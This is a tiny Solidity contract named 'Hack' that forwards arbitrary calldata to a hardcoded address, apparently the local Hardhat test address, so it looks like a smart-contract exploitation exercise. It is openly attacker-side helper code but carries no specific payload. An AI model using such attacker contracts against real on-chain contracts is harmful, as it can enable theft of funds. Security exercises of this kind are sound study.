// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    address public attackAddres=0x5FbDB2315678afecb367f032d93F642f64180aa3;

    function hack(bytes memory _data) external  {
     (bool success,)=attackAddres.call(_data);
     require(success,"hack failed!");
    }

   

}